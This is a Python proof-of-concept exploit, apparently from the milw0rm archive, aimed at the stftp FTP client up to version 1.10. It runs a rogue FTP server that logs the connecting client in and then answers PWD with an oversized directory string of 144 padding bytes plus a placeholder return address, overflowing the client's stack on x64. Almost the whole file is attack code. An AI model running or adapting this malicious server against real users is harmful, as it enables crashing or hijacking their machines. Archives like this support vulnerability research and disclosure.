#!/usr/bin/python
# stftp <= 1.10 (PWD Response Stack Overflow) PoC
# Tested on: OpenSuSE 11.1 x64
# Coding: sqlevil - sqlevil@hotmail.com
# Viva Muslam Al-Barrak

from socket import *
class tcp:   
    def __init__(self):
        self.s = socket(AF_INET, SOCK_STREAM)
        self.s.bind(("0.0.0.0",21))
    
    def getnext(self):
        print ("Listening for connection ...\n")
        self.s.listen(1)
        c,  addr = self.s.accept()
        print ("client is nOw cOnnected\n")
        return c
    def close(self):
        self.s.close();

class ftp:
    def exCommand(self, command):
        if (len(command)<80):
            print("S -> C: " + command)
        else:
            print("S -> C: " + command[0:80] + " ...")
        self.s.send(command+'\r\n')

    def getCommand(self, size=1024):
        ret = self.s.recv(size);
        if (len(ret)<80):
            print ("C -> S: " +ret)
        else:
            print ("C -> S: " +ret[0:80] + " ...")
        return ret
      
    def __init__(self,  c):
        self.s=c
        
    def Banner(self,  str="Hi There"):
        self.exCommand( "220 %s" % str)
    def Auth(self, str1="pwd please",  str2="OK"):
        self.getCommand()
        self.exCommand( "331 %s" % str1)
        self.getCommand()
        self.exCommand( "230 %s" % str2)
        
    def PWD(self,  path='/',  str='"%s" is current directory.'):
        self.getCommand()
        self.exCommand( '257 %s' % str % path)
        
    def Reject(self):
        self.getCommand()
        self.exCommand( "230 ERR Type set to I.")
    def SYST(self):
        self.getCommand()
        self.exCommand( "215 UNIX Type: L8")
    def PORT(self):
        self.getCommand()
        self.exCommand( "200 PORT command successful.")
        
    def CWD(self):
        self.getCommand()
        self.exCommand( "250 CWD command successful.")
    def PASIV(self):
        self.getCommand()
        self.exCommand( "227 Entering Passive Mode (174,142,51,122,17,214).")
    def stftp(self):
        # TODO: Enter yOur desire address here
        retadd='abcdefghi'
        self.Banner()
        self.Auth()
        # This custom string is adjusted for x64 architeture
        self.PWD('x'*144+retadd)
        self.getCommand()
t = tcp()
try:
    f=ftp(t.getnext())
    f.stftp()
    
except: pass
finally:
    t.close()
    print "by3 <<<"

# milw0rm.com [2009-07-27]
